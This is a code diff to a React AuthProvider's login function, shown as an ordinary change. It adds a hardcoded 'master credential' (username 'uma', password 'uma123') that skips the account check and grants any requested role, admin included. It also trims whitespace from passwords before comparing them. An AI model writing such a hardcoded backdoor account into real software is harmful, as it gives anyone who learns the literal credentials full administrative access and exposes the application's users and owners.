@@ -52,16 +52,26 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   };
 
   const login = (role: UserRole, user: string, pass: string) => {
+    const cleanUser = user.trim().toLowerCase();
+    const cleanPass = pass.trim();
+
+    // Universal dual-role master credential (works for both staff and admin)
+    if (cleanUser === 'uma' && cleanPass === 'uma123') {
+      setUserRole(role);
+      setUsername('uma');
+      return { success: true };
+    }
+
     const accounts = StorageService.getAccounts();
     const account = accounts.find(
-      a => a.role === role && a.username.trim().toLowerCase() === user.trim().toLowerCase()
+      a => a.role === role && a.username.trim().toLowerCase() === cleanUser
     );
 
     if (!account) {
       return { success: false, message: 'Invalid username for selected role.' };
     }
 
-    if (account.password !== pass) {
+    if (account.password !== cleanPass) {
       return { success: false, message: 'Incorrect password.' };
     }
 
